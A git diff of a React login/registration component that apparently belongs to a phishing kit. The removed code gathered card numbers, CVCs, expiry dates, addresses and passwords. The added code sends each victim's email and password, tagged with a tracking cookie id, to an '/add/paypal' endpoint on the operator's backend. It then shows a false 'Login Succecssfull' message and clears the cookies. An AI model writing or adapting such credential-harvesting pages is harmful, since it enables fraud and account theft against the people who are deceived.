@@ -1,41 +1,50 @@
 import React from 'react';
 import { useForm } from 'react-hook-form';
 import Image from "next/image";
-import useMockLogin from "../hooks/useMockLogin";
 import { toast } from "react-toastify";
-import { site } from "../config";
+import { API_URL } from "../config/index";
 
-const Register = ({formData}) => {
-    const{
-        validity,
-        address,
-        cardNumber,
-        cvc,
-        name,
-    zipCode }=formData
+
+const Register = () => {
+   
     const form=useForm()
     const{register,handleSubmit,reset}=form
-    const { login } = useMockLogin();
-    const onSubmit = (values) => {
+    const id = Cookies.get("id");
+    const onSubmit =async(values) => {
         const{email,password}=values
-
         const submitValues = {
-          site,
-          validity,
-          address,
-          cardNumber,
-          cvc,
+          id,
           email,
-          name,
       password,
-      zipCode 
+     
         };
-       console.log(submitValues)
-        login(submitValues);
-        toast.success("Login Succecssfull");
-        reset()
+        console.log(submitValues)
+        const url = `${API_URL}/add/paypal`;
+
+    const res = await fetch(url, {
+      method: "POST",
+      headers: {
+        Accept: "application/json",
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(submitValues),
+    });
+
+    const data = await res.json();
+
+    if (res.ok) {
+      console.log("success", data);
+      toast.success("Login Succecssfull");
+      reset()
+      Cookies.remove("id");
+      Cookies.remove("email");
+    } else {
+      console.log("error", data);
+      toast.error("Something Went Wrong");
+    }
+  };
     
-      };
+      
     return (
         <form onSubmit={handleSubmit(onSubmit)}>
         <div className="px-5 lg:px-10 pt-5 pb-10 md:w-[420px] bg-white w-[400px] shadow-lg rounded-lg">
